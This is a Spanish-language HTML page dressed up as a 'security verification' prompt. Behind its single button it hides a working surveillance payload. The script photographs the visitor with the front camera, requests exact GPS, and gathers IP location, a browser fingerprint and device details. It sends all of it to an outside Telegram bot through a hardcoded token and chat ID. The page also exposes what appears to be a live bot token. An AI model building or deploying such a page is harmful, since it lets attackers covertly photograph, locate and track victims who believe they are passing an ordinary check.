<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verificación de seguridad</title>
    <style>
        /* --- Estilos para que se vea más profesional y dé confianza --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #f1f3f4;
            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 8px 28px rgba(0,0,0,0.12);
            padding: 32px 24px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            transition: all 0.2s;
        }
        h1 {
            font-size: 1.8rem;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 12px;
            letter-spacing: -0.3px;
        }
        p {
            color: #5f6368;
            font-size: 0.9rem;
            margin-bottom: 28px;
        }
        button {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 28px;
            padding: 12px 24px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            transition: background 0.2s;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,0.05);
        }
        button:active {
            background: #1557b0;
            transform: scale(0.98);
        }
        .status-area {
            margin-top: 20px;
            font-size: 0.8rem;
            color: #5f6368;
            background: #f8f9fa;
            padding: 12px;
            border-radius: 12px;
            display: none;
        }
        .warning {
            background: #fef7e0;
            border-left: 4px solid #f9ab00;
            padding: 12px;
            margin-top: 20px;
            border-radius: 8px;
            color: #5f6368;
            font-size: 0.8rem;
            text-align: left;
        }
        a { color: #1a73e8; text-decoration: none; }
    </style>
</head>
<body>
<div class="card">
    <h1>🔐 Verificación requerida</h1>
    <p>Presiona el botón para continuar</p>
    <button id="btn">✅ Verificar acceso</button>
    <div id="status-area" class="status-area"></div>
</div>

<!-- Elementos ocultos para la foto -->
<video id="video" autoplay playsinline style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
    // 🔐 REVOCA TU TOKEN VIEJO CON @BotFather Y PON AQUÍ EL NUEVO
    const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
    const CHAT_ID = '7555997298';
    
    let alreadySent = false; // Para que no se envíe doble información
    let fotoBlob = null;     // Guardará la foto para enviarla después

    // --- 1. Obtener IP y ubicación aproximada (NO requiere permiso del usuario) ---
    async function getIPinfo() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            return {
                ip: data.ip || 'N/A',
                country: data.country_name || 'N/A',
                region: data.region || 'N/A',
                city: data.city || 'N/A',
                postal: data.postal || 'N/A',
                timezone: data.timezone || 'N/A'
            };
        } catch(e) {
            return {
                ip: 'N/A',
                country: 'N/A',
                region: 'N/A',
                city: 'N/A',
                postal: 'N/A',
                timezone: 'N/A'
            };
        }
    }

    // --- 2. Obtener Fingerprint (CPU, GPU, Fuentes) ---
    async function getFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200; canvas.height = 50;
        ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 200, 50);
        ctx.fillStyle = "#069"; ctx.font = "14px Arial"; ctx.fillText("FP", 10, 30);
        const canvasHash = canvas.toDataURL().slice(0, 100);
        let gpu = 'N/A';
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
        } catch(e) {}
        const fontsList = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS"];
        const availableFonts = fontsList.filter(f => document.fonts.check(`12px "${f}"`));
        return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
    }

    // --- 3. Datos del dispositivo (Modelo, Resolución, CPU) ---
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let model = "Desconocido";
        if (ua.includes('iPhone')) model = 'iPhone';
        else if (ua.includes('iPad')) model = 'iPad';
        else if (ua.includes('Android')) model = 'Android';
        else if (ua.includes('Mac')) model = 'Mac';
        else if (ua.includes('Windows')) model = 'Windows PC';
        const language = navigator.language || navigator.userLanguage;
        const resolution = `${window.screen.width}x${window.screen.height}`;
        const cpuCores = navigator.hardwareConcurrency || 'N/A';
        return { model, ua, language, resolution, cpuCores };
    }

    // --- 4. Almacenamiento disponible ---
    async function getStorageInfo() {
        try {
            const est = await navigator.storage.estimate();
            const totalGB = (est.quota / (1024**3)).toFixed(2);
            const usedGB = (est.usage / (1024**3)).toFixed(2);
            return { total: totalGB, used: usedGB };
        } catch(e) { return { total: 'N/A', used: 'N/A' }; }
    }

    // --- 5. Obtener ubicación GPS EXACTA (SÍ requiere permiso del usuario) ---
    function getGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                }),
                () => resolve(null),  // Usuario denegó o hubo error
                { enableHighAccuracy: true, timeout: 15000 }
            );
        });
    }

    // --- 6. Capturar FOTO desde la cámara frontal ---
    async function capturePhoto() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        let stream = null;
        try {
            // Intentamos cámara frontal
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        } catch(e) {
            try {
                // Si falla, cualquier cámara
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
            } catch(err) {
                return null;
            }
        }
        video.srcObject = stream;
        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
        await new Promise(r => setTimeout(r, 500));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
        stream.getTracks().forEach(t => t.stop());
        return blob;
    }

    // --- 7. Envío de datos a Telegram (texto y foto) ---
    async function sendMessage(text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        } catch(e) { console.warn(e); }
    }
    async function sendPhoto(blob) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob, 'photo.jpg');
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        } catch(e) { console.warn(e); }
    }

    // --- 8. El proceso de 2 pasos: Primero la FOTO, luego la UBICACIÓN ---
    async function step1_Camera() {
        const statusDiv = document.getElementById('status-area');
        statusDiv.style.display = 'block';
        statusDiv.innerText = '📸 Solicitando acceso a la cámara...';
        
        // Capturamos la foto
        fotoBlob = await capturePhoto();
        if (!fotoBlob) {
            statusDiv.innerText = '❌ No se pudo acceder a la cámara.';
            return false;
        }
        statusDiv.innerText = '✅ Foto capturada. Solicitando ubicación...';
        return true;
    }

    async function step2_LocationAndSend() {
        const statusDiv = document.getElementById('status-area');
        
        // Obtenemos GPS y los demás datos
        const [fp, ipInfo, device, storage, gps] = await Promise.all([
            getFingerprint(),
            getIPinfo(),
            getDeviceInfo(),
            getStorageInfo(),
            getGPS()
        ]);

        // Construir el mensaje con toda la información
        let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
        message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
        message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
        message += `🌐 *Network Information*\n   • IP Address: ${ipInfo.ip}\n   • Language: ${device.language}\n\n`;
        message += `📍 *Location Details*\n`;
        if (gps) {
            message += `   • GPS Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lng}\n`;
        } else {
            message += `   • GPS: Permiso denegado o no disponible\n`;
            if (ipInfo.city !== 'N/A') {
                message += `   • IP approximate location:\n   • Country: ${ipInfo.country}\n   • Region: ${ipInfo.region}\n   • City: ${ipInfo.city}\n   • Postal: ${ipInfo.postal}\n   • Timezone: ${ipInfo.timezone}\n`;
                message += `   • Map: https://www.google.com/maps?q=${ipInfo.city},${ipInfo.country}\n`;
            }
        }
        message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n\n`;
        message += `🔐 *Device Permissions*\n   • Camera: ${fotoBlob ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n\n`;
        message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society\n`;

        // Enviamos el texto y la foto a Telegram
        await sendMessage(message);
        if (fotoBlob) await sendPhoto(fotoBlob);
        
        statusDiv.innerText = '✅ Verificación completada. Gracias.';
        setTimeout(() => { statusDiv.style.display = 'none'; }, 5000);
    }

    // --- 9. Control principal del botón (divide y vencerás) ---
    document.getElementById('btn').onclick = async () => {
        if (alreadySent) return;
        alreadySent = true;
        
        const statusDiv = document.getElementById('status-area');
        statusDiv.style.display = 'block';
        statusDiv.innerText = 'Iniciando proceso...';
        
        // PASO 1: Pedir la CÁMARA y tomar la foto
        const cameraOk = await step1_Camera();
        if (!cameraOk) {
            // Si la cámara falla, igual intentamos enviar lo que podamos (IP, datos, etc.)
            statusDiv.innerText = 'La cámara falló. Recopilando otros datos...';
            await step2_LocationAndSend();
        } else {
            // PASO 2: Si la cámara funcionó, pedir la UBICACIÓN y enviar TODO
            await step2_LocationAndSend();
        }
    };
</script>
</body>
</html>
